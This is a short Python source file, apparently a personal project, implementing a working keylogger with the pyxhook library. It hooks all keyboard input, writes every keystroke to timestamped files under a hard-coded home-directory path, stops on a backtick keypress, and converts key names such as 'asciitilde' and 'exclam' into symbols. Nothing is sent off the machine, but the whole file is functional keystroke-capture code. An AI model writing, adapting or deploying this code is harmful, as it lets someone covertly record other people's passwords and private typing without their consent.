import pyxhook
import sys
from time import gmtime, strftime
import os

x=strftime("%Y-%m-%d_%H:%M:%S", gmtime())

os.system('mkdir /home/lienordni/Desktop/Code/Keys/Vault/'+x)
temp_file='/home/lienordni/Desktop/Code/Keys/Vault/'+x+'/real.txt'
log_file='/home/lienordni/Desktop/Code/Keys/Vault/'+x+'/formatted.txt'

def make_readable():
	# print("Making Readable")

	fsn=open(temp_file,'r')
	fsx=open(log_file,'w')
	

	text=fsn.read()
	text=text.replace('<Shift_R>asciitilde','~')
	text=text.replace('asciitilde','~')

	text=text.replace('<Shift_R>exclam','!')
	text=text.replace('exclam','!')

	text=text.replace('<Shift_R>at','@')
	# text=text.replace('at','@')

	text=text.replace('<Shift_R>numbersign','#')
	text=text.replace('numbersign','#')

	text=text.replace('<Shift_R>dollar','$')
	text=text.replace('dollar','$')

	text=text.replace('<Shift_R>percent','%')
	text=text.replace('percent','%')

	text=text.replace('<Shift_R>asciicircum','^')
	text=text.replace('asciicircum','^')

	text=text.replace('<Shift_R>ampersand','&')
	text=text.replace('ampersand','&')

	text=text.replace('<Shift_R>asterisk','*')
	text=text.replace('asterisk','*')

	text=text.replace('<Shift_R>parenleft','(')
	text=text.replace('parenleft','(')

	text=text.replace('<Shift_R>parenright',')')
	text=text.replace('parenright',')')

	text=text.replace('minus','-')

	text=text.replace('equal','=')

	text=text.replace('<Shift_R>underscore','_')
	text=text.replace('underscore','_')

	text=text.replace('<Shift_R>plus','+')
	text=text.replace('plus','+')

	text=text.replace('bracketleft','[')

	text=text.replace('bracketright',']')

	text=text.replace('backslash','\\')

	text=text.replace('<Shift_R>braceleft','{')
	text=text.replace('braceleft','{')

	text=text.replace('<Shift_R>braceright','}')
	text=text.replace('braceright','}')

	text=text.replace('<Shift_R>bar','|')
	text=text.replace('bar','|')

	text=text.replace('semicolon',';')

	text=text.replace('apostrophe','\'')

	text=text.replace('<Shift_R>colon',':')
	text=text.replace('colon',':')

	text=text.replace('<Shift_R>quotedbl','\"')
	text=text.replace('quotedbl','\"')

	text=text.replace('comma',',')

	text=text.replace('period','.')

	text=text.replace('slash','/')

	text=text.replace('<Shift_R>less','<')
	text=text.replace('less','<')

	text=text.replace('<Shift_R>greater','>')
	text=text.replace('greater','>')

	text=text.replace('<Shift_R>question','?')
	text=text.replace('question','?')

	fsx.write(text)

	fsn.close()
	fsx.close()

def OnKeyPress(event):
	fs=open(temp_file,'a')

	z=event.Ascii
	x=event.Key

	if z==96:
		fs.close()
		new_hook.cancel()
		make_readable()

	if(z>=33 and z<=126):
		fs.write(x)
	
	elif z==32:
		fs.write(' ')

	else:
		if x=='BackSpace':
			fs.write(chr(171))

		elif x=='Shift_R' or x=='Shift_L' or x=='Alt_R' or x=='Alt_L' or x=='Control_R' or x=='Control_L':
			fs.write('<'+x+'>')

		else:
			fs.write('<'+x+'>\n')


#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session new_hook.start()
new_hook.start()